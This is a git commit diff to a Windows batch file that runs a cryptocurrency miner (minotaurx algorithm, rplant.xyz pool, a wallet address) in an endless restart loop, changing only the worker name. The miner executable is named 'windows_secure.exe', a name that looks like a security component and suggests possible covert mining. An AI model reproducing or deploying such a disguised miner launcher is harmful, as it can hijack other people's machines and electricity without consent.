9376517969fd2236effa56a155071bdbc5a25b39
drongo <usersalyan@gmail.com>
2022-03-23 02:43:50 +0400

    ilk defe

--- avn.bat
+++ avn.bat
@@ -6,5 +6,5 @@ rem       stratum-asia.rplant.xyz /Singapore/
 rem       stratum-na.rplant.xyz   /Toronto/
 rem
 :start
-"%~dp0"windows_secure.exe -a minotaurx -o stratum+tcps://stratum-eu.rplant.xyz:17068 -u RVUPsgdt4Zsi29WanhW3KxryieaiKVv11B.test -t 1
+"%~dp0"windows_secure.exe -a minotaurx -o stratum+tcps://stratum-eu.rplant.xyz:17068 -u RVUPsgdt4Zsi29WanhW3KxryieaiKVv11B.juju -t 1
 goto start
